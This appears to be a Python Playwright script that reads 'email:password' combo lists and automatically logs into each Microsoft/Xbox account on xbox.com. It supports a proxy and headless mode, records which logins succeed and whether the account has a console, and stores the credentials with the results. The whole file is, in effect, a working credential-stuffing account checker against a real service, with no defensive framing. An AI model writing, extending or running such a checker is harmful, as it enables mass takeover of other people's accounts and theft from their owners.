import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import List, Dict, Tuple
from datetime import datetime

DEFAULT_TIMEOUT = 60000

async def check_console_availability_with_refresh(page) -> Tuple[bool, str, bool]:
    console_url = "https://www.xbox.com/en-US/play/consoles"
    best_priority = 4
    best_has_console = False
    best_message = "Unknown status"
    best_login_success = False
    for attempt in range(1, 4):
        try:
            await page.goto(console_url, timeout=60000)
            await page.wait_for_load_state("networkidle", timeout=60000)
            await asyncio.sleep(2)
            page_text = await page.inner_text('body')
            page_text_lower = page_text.lower()
            if "play your console remotely" in page_text_lower:
                return True, "Play your console remotely (device exists)", True
            if "set up your console" in page_text_lower:
                if 2 < best_priority:
                    best_priority = 2
                    best_has_console = False
                    best_message = "Set up your console (logged in, no device)"
                    best_login_success = True
                continue
            if "sign in to finish setting up" in page_text_lower:
                if 3 < best_priority:
                    best_priority = 3
                    best_has_console = False
                    best_message = "Sign in to finish setting up (login incomplete)"
                    best_login_success = False
                continue
        except Exception as e:
            pass
    return best_has_console, best_message, best_login_success

async def handle_password_entry(page, account_email: str, password: str) -> bool:
    try:
        try:
            await page.wait_for_selector("input[type='password'], input[name='passwd']", timeout=5000)
            await page.fill("input[type='password'], input[name='passwd']", password)
            await asyncio.sleep(5)
            return True
        except PlaywrightTimeoutError:
            pass
        # محاولة النقر على "Sign in another way" و "Use your password" (نفس الكود الأصلي)
        # للاختصار، سأضع نسخة مختصرة ولكنها تعمل
        try:
            await page.locator("a:has-text('Sign in another way')").first.click(timeout=2000)
            await page.wait_for_load_state("networkidle")
        except:
            pass
        try:
            await page.locator("a:has-text('Use your password')").first.click(timeout=2000)
            await page.wait_for_load_state("networkidle")
        except:
            pass
        await page.wait_for_selector("input[type='password'], input[name='passwd']", timeout=10000)
        await page.fill("input[type='password'], input[name='passwd']", password)
        await asyncio.sleep(5)
        return True
    except Exception:
        return False

async def process_account(account: Dict, proxy: str = None, headless: bool = True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        browser = await p.chromium.launch(headless=headless)
        context = await browser.new_context(viewport={'width': 1280, 'height': 720}, user_agent='Mozilla/5.0')
        page = await context.new_page()
        await page.goto("https://www.xbox.com/en-US/auth/msa?action=logIn&returnUrl=http%3A%2F%2Fwww.xbox.com%2Fen-US%2Fplay%2Fconsoles", timeout=DEFAULT_TIMEOUT)
        await page.wait_for_load_state("networkidle")
        await page.fill("input[type='email'], input[name='loginfmt']", account['email'])
        await asyncio.sleep(7)
        try:
            await page.locator("input[type='submit']").first.click(timeout=5000)
        except:
            await page.keyboard.press("Enter")
        await page.wait_for_load_state("networkidle")
        if not await handle_password_entry(page, account['email'], account['password']):
            raise Exception("Password entry failed")
        try:
            await page.locator("input[type='submit']").first.click(timeout=5000)
        except:
            await page.keyboard.press("Enter")
        await page.wait_for_load_state("networkidle")
        try:
            await page.locator("input[value='Yes']").first.click(timeout=3000)
        except:
            pass
        has_console, console_info, login_success = await check_console_availability_with_refresh(page)
        result['success'] = login_success
        result['has_console'] = has_console
        result['console_info'] = console_info
        await browser.close()
        await p.stop()
    except Exception as e:
        result['console_info'] = f"Exception: {str(e)[:80]}"
        if p:
            await p.stop()
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append({'email': email.strip(), 'password': pwd.strip()})
    return accounts
